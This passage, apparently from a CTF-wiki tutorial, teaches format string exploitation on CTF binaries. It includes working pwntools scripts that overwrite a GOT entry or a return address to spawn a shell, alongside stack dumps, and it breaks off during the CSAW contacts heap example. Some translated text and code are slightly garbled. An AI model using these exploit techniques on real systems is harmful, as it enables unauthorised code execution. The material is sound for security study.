<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;enter the file name you want to get:&#39;</span><span class="p">)</span>

<span class="c1">##gdb.attach(sh)</span>

<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;/bin/sh;&#39;</span><span class="p">)</span>



<span class="c1">## system(&#39;/bin/sh&#39;)</span>

<span class="n">show_dir</span><span class="p">()</span>

<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>
<p>note</p>
<ul>
<li>The offset I used when getting the address of the puts function is 8, because I want the first 4 bytes of my output to be the address of the puts function. In fact, the offset of the first address of the format string is 7.</li>
<li>Here I used the fmtstr_payload function in pwntools to get the results we hoped for. If you are interested, you can check the official documentation. For example, here fmtstr_payload(7, {puts_got: system_addr}) means that the offset of my format string is 7, I want to write the system_addr address at the puts_got address. By default it is written in bytes.</li>
</ul>
<h2 id="hijack-retaddr">hijack retaddr<a class="headerlink" href="#hijack-retaddr" title="Permanent link">&para;</a></h2>
<h3 id="principle_2">Principle<a class="headerlink" href="#principle_2" title="Permanent link">&para;</a></h3>
<p>It&#39;s easy to understand that we&#39;re going to use the format string vulnerability to hijack the return address of the program to the address we want to execute.</p>
<h3 id="examples_2">Examples<a class="headerlink" href="#examples_2" title="Permanent link">&para;</a></h3>
<p>Here we take [three white hat-pwnme_k0] (<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/three">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/three</a> white hats-pwnme_k0) as an example for analysis.</p>
<h4 id="determining-protection_2">Determining protection<a class="headerlink" href="#determining-protection_2" title="Permanent link">&para;</a></h4>
<div class="highlight"><pre><span></span><code>➜<span class="w"> </span>Three<span class="w"> </span>white<span class="w"> </span>hats<span class="w"> </span>-<span class="w"> </span>pwnme_k0<span class="w"> </span>git:<span class="w"> </span><span class="o">(</span>master<span class="o">)</span><span class="w"> </span>✗<span class="w"> </span>checksec<span class="w"> </span>pwnme_k0
<span class="w">    </span>Arch:<span class="w">     </span>amd64-64-little

<span class="w">    </span>RELRO:<span class="w">    </span>Full<span class="w"> </span>RELRO

<span class="w">    </span>Stack:<span class="w">    </span>No<span class="w"> </span>canary<span class="w"> </span>found

<span class="w">    </span>NX:<span class="w">       </span>NX<span class="w"> </span>enabled

<span class="w">    </span>PIE:<span class="w">      </span>No<span class="w"> </span>PIE<span class="w"> </span><span class="o">(</span>0x400000<span class="o">)</span>
</code></pre></div>
<p>It can be seen that the program mainly opens NX protection and Full RELRO protection. This way we have no way to modify the got table of the program.</p>
<h4 id="_3">分析程序<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h4>
<p>A brief analysis, you know that the program seems to mainly implement a function similar to account registration, mainly modify the viewing function, and then found a format string vulnerability found in the viewing function.</p>
<div class="highlight"><pre><span></span><code><span class="kt">int</span><span class="w"> </span><span class="n">__usercall</span><span class="w"> </span><span class="n">sub_400B07</span><span class="w"> </span><span class="err">@</span><span class="w"> </span><span class="o">&lt;</span><span class="n">eax</span><span class="o">&gt;</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="n">format</span><span class="w"> </span><span class="err">@</span><span class="w"> </span><span class="o">&lt;</span><span class="n">dil</span><span class="o">&gt;</span><span class="w"> </span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">formata</span><span class="p">,</span><span class="w"> </span><span class="kr">__int64</span><span class="w"> </span><span class="n">a3</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">a4</span><span class="p">)</span>
<span class="p">{</span>

<span class="w">  </span><span class="n">write</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;Welc0me to sangebaimao!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mh">0x1AuLL</span><span class="p">);</span>

<span class="n">printf</span><span class="w"> </span><span class="p">(</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="w"> </span><span class="n">formatata</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span><span class="n">Welc0me</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">sangebaimao</span><span class="o">!</span><span class="w"> </span><span class="err">\</span><span class="w"> </span><span class="n">n</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;);</span>
<span class="k">return</span><span class="w"> </span><span class="n">printf</span><span class="w"> </span><span class="p">(</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="w"> </span><span class="n">a4</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">4</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>
<p>The output is &amp;a4 + 4. Let’s go back and find out that the password we read in is also</p>
<div class="highlight"><pre><span></span><code><span class="w">    </span><span class="n">v6</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">a4</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">4</span><span class="p">,</span><span class="w"> </span><span class="mh">0x14uLL</span><span class="p">);</span>
</code></pre></div>
<p>Of course, we can also find that the username we read in is 20 bytes from the password.</p>
<div class="highlight"><pre><span></span><code><span class="w">  </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Input your username(max lenth:20): &quot;</span><span class="p">);</span>

<span class="w">  </span><span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>

<span class="w">  </span><span class="n">v8</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">bufa</span><span class="p">,</span><span class="w"> </span><span class="mh">0x14uLL</span><span class="p">);</span>

<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">v8</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">v8</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mh">0x14u</span><span class="w"> </span><span class="p">)</span>

<span class="w">  </span><span class="p">{</span>

<span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Input your password(max lenth:20): &quot;</span><span class="p">);</span>

<span class="w">    </span><span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>

<span class="w">    </span><span class="n">v6</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">a4</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">4</span><span class="p">,</span><span class="w"> </span><span class="mh">0x14uLL</span><span class="p">);</span>

<span class="w">    </span><span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>

<span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bufa</span><span class="p">;</span>
<span class="o">*</span><span class="w"> </span><span class="p">(</span><span class="n">_</span><span class="w"> </span><span class="n">QWORD</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="n">buf</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">8</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">a3</span><span class="p">;</span>
<span class="w">    </span><span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span><span class="w"> </span><span class="o">*</span><span class="p">)(</span><span class="n">buf</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">16</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">a4</span><span class="p">;</span>
</code></pre></div>
<p>Ok, this is almost the same. In addition, you can also find that this account password is not paired and not paired.</p>
<h4 id="using-ideas">Using ideas<a class="headerlink" href="#using-ideas" title="Permanent link">&para;</a></h4>
<p>Our ultimate goal is to get the system&#39;s shell. We can find that in the given file, there is a function that directly calls system(&#39;bin/sh&#39;) at the address 0x00000000004008A6 (about this discovery, generally the program is now roughly take a look.). Then if we modify the return address of a function to this address, it is equivalent to getting the shell.</p>
<p>Although the memory that stores the return address itself is dynamically changing, its address relative to rbp does not change, so we can use the relative address to calculate. Use ideas as follows</p>
<ul>
<li>Determine the offset</li>
<li>Get the rbp and return address of the function</li>
<li>Get the address where the return address is stored based on the relative offset</li>
<li>Write the address of the execution system function call to the address where the return address is stored.</li>
</ul>
<h4 id="determining-the-offset_1">Determining the offset<a class="headerlink" href="#determining-the-offset_1" title="Permanent link">&para;</a></h4>
<p>First, let&#39;s first determine the offset. Enter the user name aaaaaaaa, enter the password casually, at the printf(&amp;a4 + 4) function that outputs the password under the breakpoint.</p>
<div class="highlight"><pre><span></span><code>Register Account first!

Input your username(max lenth:20): 

aaaaaaaa

Input your password(max lenth:20): 

%p%p%p%p%p%p%p%p%p%p

Register Success!!

1.Sh0w Account Infomation!

2.Ed1t Account Inf0mation!

3.QUit sangebaimao:(

&gt;error options

1.Sh0w Account Infomation!

2.Ed1t Account Inf0mation!

3.QUit sangebaimao:(

&gt;1

...
</code></pre></div>
<p>At this point the stack is</p>
<div class="highlight"><pre><span></span><code>─────────────────────────────────────────────────────────[ code:i386:x86-64 ]────

     0x400b1a                  call   0x400758

0x400b1fe rdi, [rbp + 0x10]
     0x400b23                  mov    eax, 0x0

 →   0x400b28                  call   0x400770

   ↳    0x400770                  jmp    QWORD PTR [rip+0x20184a]        # 0x601fc0

0x400776 xchg ax, ax
        0x400778                  jmp    QWORD PTR [rip+0x20184a]        # 0x601fc8

0x40077e xchg ax, ax
────────────────────────────────────────────────────────────────────[ stack ]────

0x00007fffffffdb40│+0x00: 0x00007fffffffdb80  →  0x00007fffffffdc30  →  0x0000000000400eb0  →   push r15     ← $rsp, $rbp

0x00007fffffffdb48│+0x08: 0x0000000000400d74  →   add rsp, 0x30

0x00007fffffffdb50│+0x10: &quot;aaaaaaaa&quot;     ← $rdi

0x00007fffffffdb58│+0x18: 0x000000000000000a

0x00007fffffffdb60│+0x20: 0x7025702500000000

0x00007fffffffdb68│+0x28: &quot;%p%p%p%p%p%p%p%pM\r@&quot;

0x00007fffffffdb70│+0x30: &quot;%p%p%p%pM\r@&quot;

0x00007fffffffdb78│+0x38: 0x0000000000400d4d  →   cmp eax, 0x2
</code></pre></div>
<p>We can find that the user name we entered is in the third position on the stack, then the position of the format string itself is removed, and the offset is 5 + 3 = 8.</p>
<h4 id="change-address">Change address<a class="headerlink" href="#change-address" title="Permanent link">&para;</a></h4>
<p>We will carefully observe the information of the stack at the breakpoint.</p>
<div class="highlight"><pre><span></span><code>0x00007fffffffdb40│+0x00: 0x00007fffffffdb80  →  0x00007fffffffdc30  →  0x0000000000400eb0  →   push r15     ← $rsp, $rbp

0x00007fffffffdb48│+0x08: 0x0000000000400d74  →   add rsp, 0x30

0x00007fffffffdb50│+0x10: &quot;aaaaaaaa&quot;     ← $rdi

0x00007fffffffdb58│+0x18: 0x000000000000000a

0x00007fffffffdb60│+0x20: 0x7025702500000000

0x00007fffffffdb68│+0x28: &quot;%p%p%p%p%p%p%p%pM\r@&quot;

0x00007fffffffdb70│+0x30: &quot;%p%p%p%pM\r@&quot;

0x00007fffffffdb78│+0x38: 0x0000000000400d4d  →   cmp eax, 0x2
</code></pre></div>
<p>You can see that the second location on the stack stores the return address of the function (in fact, the value stored in the push rip when the show account function is called), and the offset in the format string is 7.</p>
<p>At the same time, on the stack, the first element stores the rbp of the previous function. So we can get the offset 0x00007fffffffdb80 - 0x00007fffffffdb48 = 0x38. Then if we know the value of rbp, we know the address of the function return address.</p>
<p>0x0000000000400d74 is different from 0x00000000004008A6 with only 2 bytes lower, so we can only modify 2 bytes starting at 0x00007fffffffdb48.</p>
<p>It should be noted here that on some newer systems (such as ubuntu 18.04), the program crash may occur when the return address is directly modified to 0x00000000004008A6. In this case, you can consider modifying the return address to 0x00000000004008AA, that is, directly calling system(&quot;/bin /sh&quot;)</p>
<div class="highlight"><pre><span></span><code>.text:00000000004008A6 sub_4008A6      proc near

.text:00000000004008A6 ; __unwind {

.text:00000000004008A6                 push    rbp

.text:00000000004008A7                 mov     rbp, rsp

.text:00000000004008AA &lt;- here         mov     edi, offset command ; &quot;/bin/sh&quot;

.text:00000000004008AF                 call    system

.text:00000000004008B4                 pop     rdi

.text:00000000004008B5                 pop     rsi

.text:00000000004008B6                 pop     rdx

.text: 00000000004008B7 retn
</code></pre></div>
<h4 id="using-the-program_1">Using the program<a class="headerlink" href="#using-the-program_1" title="Permanent link">&para;</a></h4>
<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&quot;debug&quot;</span>

<span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s2">&quot;amd64&quot;</span>



<span class="n">sh</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s2">&quot;./pwnme_k0&quot;</span><span class="p">)</span>

<span class="n">binary</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;pwnme_k0&quot;</span><span class="p">)</span>

<span class="c1">#gdb.attach(sh)</span>



<span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>

<span class="n">sh</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s2">&quot;1&quot;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>

<span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>

<span class="n">sh</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s2">&quot;%6$p&quot;</span><span class="p">)</span>

<span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>

<span class="n">sh</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>

<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;0x&quot;</span><span class="p">)</span>

<span class="n">ret_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x38</span>

<span class="n">Success</span> <span class="p">(</span> <span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span><span class="n">ret_addr</span><span class="p">:</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span> <span class="o">+</span> <span class="n">Hex</span> <span class="p">(</span><span class="n">ret_addr</span><span class="p">))</span>




<span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>

<span class="n">sh</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s2">&quot;2&quot;</span><span class="p">)</span>

<span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>

<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span> <span class="p">(</span><span class="n">p64</span> <span class="p">(</span><span class="n">ret_addr</span><span class="p">))</span>
<span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>

<span class="c1">#sh.writeline(&quot;%2214d%8$hn&quot;)</span>

<span class="c1">#0x4008aa-0x4008a6</span>

<span class="n">sh</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">%2218d</span><span class="s2">%8$hn&quot;</span><span class="p">)</span>



<span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>

<span class="n">sh</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>

<span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>

<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>
<h2 id="formatted-string-vulnerability-on-heap">Formatted string vulnerability on heap<a class="headerlink" href="#formatted-string-vulnerability-on-heap" title="Permanent link">&para;</a></h2>
<h3 id="principle_3">Principle<a class="headerlink" href="#principle_3" title="Permanent link">&para;</a></h3>
<p>The so-called formatted string on the heap means that the formatted string itself is stored on the heap. This mainly increases the difficulty of getting the corresponding offset. In general, the formatted string is likely to be copied. On the stack.</p>
<h3 id="examples_3">Examples<a class="headerlink" href="#examples_3" title="Permanent link">&para;</a></h3>
<p>Here we take [contacts] (<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2015-CSAW-contacts">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2015-CSAW-contacts</a>) in CSAW 2015 as an example.</p>
<h4 id="determining-protection_3">Determining protection<a class="headerlink" href="#determining-protection_3" title="Permanent link">&para;</a></h4>
<div class="highlight"><pre><span></span><code>➜<span class="w">  </span><span class="m">2015</span>-CSAW-contacts<span class="w"> </span>git:<span class="o">(</span>master<span class="o">)</span><span class="w"> </span>✗<span class="w"> </span>checksec<span class="w"> </span>contacts

<span class="w">    </span>Arch:<span class="w">     </span>i386-32-little

<span class="w">    </span>RELRO:<span class="w">    </span>Partial<span class="w"> </span>RELRO

<span class="w">    </span>Stack:<span class="w">    </span>Canary<span class="w"> </span>found

<span class="w">    </span>NX:<span class="w">       </span>NX<span class="w"> </span>enabled

<span class="w">    </span>PIE:<span class="w">      </span>No<span class="w"> </span>PIE<span class="w"> </span><span class="o">(</span>0x8048000<span class="o">)</span>
</code></pre></div>
<p>It can be seen that the program not only turns on NX protection but also turns on Canary.</p>
<h4 id="_4">分析程序<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h4>
<p>A simple look at the program, found that the program, as the name describes, is a contact-related program that can create, modify, delete, and print contact information. And after reading it carefully, you can find a format string vulnerability when printing contact information.</p>
<div class="highlight"><pre><span></span><code><span class="kt">int</span><span class="w"> </span><span class="kr">__cdecl</span><span class="w"> </span><span class="n">PrintInfo</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">a1</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">a2</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">a3</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">format</span><span class="p">)</span>

<span class="p">{</span>

<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\t</span><span class="s">Name: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">a1</span><span class="p">);</span>

<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\t</span><span class="s">Length %u</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">a2</span><span class="p">);</span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\t</span><span class="s">Phone #: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">a3</span><span class="p">);</span>

<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\t</span><span class="s">Description: &quot;</span><span class="p">);</span>

<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">printf</span><span class="p">(</span><span class="n">format</span><span class="p">);</span>

<span class="p">}</span>
</code></pre></div>
<p>Take a closer look and you can see that this format actually points to the heap.</p>
<h4 id="using-ideas_1">Using ideas<a class="headerlink" href="#using-ideas_1" title="Permanent link">&para;</a></h4>
<p>Our basic purpose is to get the system&#39;s shell and get the flag. In fact, since there is a format string vulnerability, we should be able to control the program flow by hijacking the got table or controlling the return address of the program. But it is not very feasible here. The reasons are as follows</p>
<ul>
<li>The reason why we can&#39;t hijack got to control the program flow is because we found that only the printf function that can be output to our given string is common in the program. We only have to select it to construct /bin/sh to execute it. (&#39;/bin/sh&#39;), but the printf function is also used elsewhere, which will cause the program to crash directly.</li>
<li>Secondly, it is not possible to directly control the program return address to control the program flow because we do not have a directly executable address to store our contents, and use the format string to write directly to the stack system__addr + &#39;bbbb &#39; + addr of &#39;/bin/sh&#39; doesn&#39;t seem to be realistic.</li>
</ul>
<p>So what can we do? We also have the skills to talk about stack overflow before, stack pivoting. And here, what we can control happens to be heap memory, so we can move the stack to the heap. Here we use the leave command for stack migration, so before migration we need to modify the program to save the value of ebp to the value we want. Only then will esp become the value we want when we execute the leave instruction. At the same time, because we are using the format string to modify, so we have to know the address of the ebp store, and the address of the ebp stored in the PrintInfo function changes every time, and we can not know by other means. . However, the ebp value pushed into the stack in the program actually saves the address of the ebp value of the previous function<strong>, so we can modify the value of the saved ebp of the upper layer function, ie the upper upper layer function ( That is, the main function) ebp value</strong>. In this way, when the upper program returns, the operation of migrating the stack to the heap is implemented.</p>
<p>The basic idea is as follows</p>
<ul>
<li>First get the address of the system function</li>
<li>Determine by libc database by leaking the address of a libc function.</li>
<li>Construct a basic contact description as system_addr + &#39;bbbb&#39; + binsh_addr</li>
<li>Modify the ebp saved by the upper function (ie the ebp of the upper layer function) to the address -** of the storage system_addr.</li>
<li>When the main program returns, the following operations will occur</li>
<li>move esp, ebp, point esp to the address of system_addr -4</li>
<li>pop ebp, point esp to system_addr</li>
<li>ret, get the shell by pointing eip to system_addr.</li>
</ul>
<h4 id="get-the-relevant-address-and-offset">Get the relevant address and offset<a class="headerlink" href="#get-the-relevant-address-and-offset" title="Permanent link">&para;</a></h4>
<p>Here we mainly get the system function address, /bin/sh address, the address of the contact description stored on the stack, and the address of the PrintInfo function.</p>
<p>First, we get the system function address and /bin/sh address according to the libc_start_main_ret address stored on the stack (which is the function that will run when the main function returns). We construct the corresponding contact, then choose to output the contact information, and breakpoints at printf, and run until the printf function of the format string vulnerability, as follows</p>
<div class="highlight"><pre><span></span><code><span class="w"> </span>→<span class="w"> </span>0xf7e44670<span class="w"> </span>&lt;printf+0&gt;<span class="w">       </span>call<span class="w">   </span>0xf7f1ab09<span class="w"> </span>&lt;__x86.get_pc_thunk.ax&gt;

<span class="w">   </span>↳<span class="w">  </span>0xf7f1ab09<span class="w"> </span>&lt;__x86.get_pc_thunk.ax+0&gt;<span class="w"> </span>mov<span class="w">    </span>eax,<span class="w"> </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp<span class="o">]</span>

<span class="w">      </span>0xf7f1ab0c<span class="w"> </span>&lt;__x86.get_pc_thunk.ax+3&gt;<span class="w"> </span>ret<span class="w">    </span>

<span class="w">      </span>0xf7f1ab0d<span class="w"> </span>&lt;__x86.get_pc_thunk.dx+0&gt;<span class="w"> </span>mov<span class="w">    </span>edx,<span class="w"> </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp<span class="o">]</span>

<span class="w">      </span>0xf7f1ab10<span class="w"> </span>&lt;__x86.get_pc_thunk.dx+3&gt;<span class="w"> </span>ret<span class="w">    </span>

───────────────────────────────────────────────────────────────────────────────────────<span class="o">[</span><span class="w"> </span>stack<span class="w"> </span><span class="o">]</span>────

<span class="o">[</span><span class="s1">&#39;0xffffccfc&#39;</span>,<span class="w"> </span><span class="s1">&#39;l8&#39;</span><span class="o">]</span>

<span class="m">8</span>

0xffffccfc│+0x00:<span class="w"> </span>0x08048c27<span class="w">  </span>→<span class="w">   </span>leave<span class="w">      </span>←<span class="w"> </span><span class="nv">$esp</span>

0xffffcd00│+0x04:<span class="w"> </span>0x0804c420<span class="w">  </span>→<span class="w">  </span><span class="s2">&quot;1234567&quot;</span>

0xffffcd04│+0x08:<span class="w"> </span>0x0804c410<span class="w">  </span>→<span class="w">  </span><span class="s2">&quot;11111&quot;</span>

0xffffcd08│+0x0c:<span class="w"> </span>0xf7e5acab<span class="w">  </span>→<span class="w">  </span>&lt;puts+11&gt;<span class="w"> </span>add<span class="w"> </span>ebx,<span class="w"> </span>0x152355

0xffffcd0c│+0x10:<span class="w"> </span>0x00000000

0xffffcd10│+0x14:<span class="w"> </span>0xf7fad000<span class="w">  </span>→<span class="w">  </span>0x001b1db0

0xffffcd14│+0x18:<span class="w"> </span>0xf7fad000<span class="w">  </span>→<span class="w">  </span>0x001b1db0

0xffffcd18│+0x1c:<span class="w"> </span>0xffffcd48<span class="w">  </span>→<span class="w">  </span>0xffffcd78<span class="w">  </span>→<span class="w">  </span>0x00000000<span class="w">   </span>←<span class="w"> </span><span class="nv">$ebp</span>

──────────────────────────────────────────────────────────────────────────────────────────<span class="o">[</span><span class="w"> </span>trace<span class="w"> </span><span class="o">]</span>────

<span class="o">[</span><span class="c1">#0] 0xf7e44670 → Name: __printf(format=0x804c420 &quot;1234567\n&quot;)</span>

<span class="o">[</span><span class="c1">#1] 0x8048c27 → leave </span>

<span class="o">[</span><span class="c1">#2] 0x8048c99 → add DWORD PTR [ebp-0xc], 0x1</span>

<span class="o">[</span><span class="c1"># 3] 0x80487a2 → jmp 0x80487b3</span>
<span class="o">[</span><span class="c1">#4] 0xf7e13637 → Name: __libc_start_main(main=0x80486bd, argc=0x1, argv=0xffffce14, init=0x8048df0, fini=0x8048e60, rtld_fini=0xf7fe88a0 &lt;_dl_fini&gt;, stack_end=0xffffce0c)</span>

<span class="o">[</span><span class="c1"># 5] 0x80485e1 → holds</span>
────────────────────────────────────────────────────────────────────────────────────────────────────

gef➤<span class="w">  </span>dereference<span class="w"> </span><span class="nv">$esp</span><span class="w"> </span><span class="m">140</span>

<span class="o">[</span><span class="s1">&#39;$esp&#39;</span>,<span class="w"> </span><span class="s1">&#39;140&#39;</span><span class="o">]</span>

<span class="m">1</span>

0xffffccfc│+0x00:<span class="w"> </span>0x08048c27<span class="w">  </span>→<span class="w">   </span>leave<span class="w">      </span>←<span class="w"> </span><span class="nv">$esp</span>

gef➤<span class="w">  </span>dereference<span class="w"> </span><span class="nv">$esp</span><span class="w"> </span>l140

<span class="o">[</span><span class="s1">&#39;$esp&#39;</span>,<span class="w"> </span><span class="s1">&#39;l140&#39;</span><span class="o">]</span>

<span class="m">140</span>

0xffffccfc│+0x00:<span class="w"> </span>0x08048c27<span class="w">  </span>→<span class="w">   </span>leave<span class="w">      </span>←<span class="w"> </span><span class="nv">$esp</span>

0xffffcd00│+0x04:<span class="w"> </span>0x0804c420<span class="w">  </span>→<span class="w">  </span><span class="s2">&quot;1234567&quot;</span>

0xffffcd04│+0x08:<span class="w"> </span>0x0804c410<span class="w">  </span>→<span class="w">  </span><span class="s2">&quot;11111&quot;</span>

0xffffcd08│+0x0c:<span class="w"> </span>0xf7e5acab<span class="w">  </span>→<span class="w">  </span>&lt;puts+11&gt;<span class="w"> </span>add<span class="w"> </span>ebx,<span class="w"> </span>0x152355

0xffffcd0c│+0x10:<span class="w"> </span>0x00000000

0xffffcd10│+0x14:<span class="w"> </span>0xf7fad000<span class="w">  </span>→<span class="w">  </span>0x001b1db0

0xffffcd14│+0x18:<span class="w"> </span>0xf7fad000<span class="w">  </span>→<span class="w">  </span>0x001b1db0

0xffffcd18│+0x1c:<span class="w"> </span>0xffffcd48<span class="w">  </span>→<span class="w">  </span>0xffffcd78<span class="w">  </span>→<span class="w">  </span>0x00000000<span class="w">   </span>←<span class="w"> </span><span class="nv">$ebp</span>

0xffffcd1c│+0x20:<span class="w"> </span>0x08048c99<span class="w">  </span>→<span class="w">   </span>add<span class="w"> </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>ebp-0xc<span class="o">]</span>,<span class="w"> </span>0x1

0xffffcd20│+0x24:<span class="w"> </span>0x0804b0a8<span class="w">  </span>→<span class="w">  </span><span class="s2">&quot;11111&quot;</span>

0xffffcd24│+0x28:<span class="w"> </span>0x00002b67<span class="w"> </span><span class="o">(</span><span class="s2">&quot;g+&quot;</span>?<span class="o">)</span>

0xffffcd28│+0x2c:<span class="w"> </span>0x0804c410<span class="w">  </span>→<span class="w">  </span><span class="s2">&quot;11111&quot;</span>

0xffffcd2c│+0x30:<span class="w"> </span>0x0804c420<span class="w">  </span>→<span class="w">  </span><span class="s2">&quot;1234567&quot;</span>

0xffffcd30│+0x34:<span class="w"> </span>0xf7fadd60<span class="w">  </span>→<span class="w">  </span>0xfbad2887

0xffffcd34│+0x38:<span class="w"> </span>0x08048ed6<span class="w">  </span>→<span class="w">  </span>0x25007325<span class="w"> </span><span class="o">(</span><span class="s2">&quot;%s&quot;</span>?<span class="o">)</span>

0xffffcd38│+0x3c:<span class="w"> </span>0x0804b0a0<span class="w">  </span>→<span class="w">  </span>0x0804c420<span class="w">  </span>→<span class="w">  </span><span class="s2">&quot;1234567&quot;</span>

0xffffcd3c│+0x40:<span class="w"> </span>0x00000000

0xffffcd40│+0x44:<span class="w"> </span>0xf7fad000<span class="w">  </span>→<span class="w">  </span>0x001b1db0

0xffffcd44│+0x48:<span class="w"> </span>0x00000000

0xffffcd48│+0x4c:<span class="w"> </span>0xffffcd78<span class="w">  </span>→<span class="w">  </span>0x00000000

